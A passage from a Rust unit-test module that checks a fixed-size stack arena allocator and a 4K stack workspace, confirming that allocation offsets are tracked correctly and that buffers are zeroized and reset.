        vec.clear();
        assert!(vec.is_empty());
    }

    #[test]
    fn test_stack_arena() {
        let mut arena: StackArena<128> = StackArena::default();
        assert_eq!(arena.remaining(), 128);

        let slice = arena.alloc_slice(32).expect("alloc 32 bytes");
        slice.fill(0x55);
        assert_eq!(arena.offset(), 32);
        assert_eq!(arena.remaining(), 96);
        assert_eq!(arena.used_slice().len(), 32);

        arena.zeroize_and_reset();
        assert_eq!(arena.offset(), 0);
        assert_eq!(arena.remaining(), 128);
    }

    #[test]
    fn test_stack_workspace_4k() {
        let mut ws = StackWorkspace4K::new();
        ws.raw_buf[0] = 0xDE;
        ws.b64_buf[0] = 0xAD;
        ws.zeroize();
        assert_eq!(ws.raw_buf[0], 0);
        assert_eq!(ws.b64_buf[0], 0);
    }
}
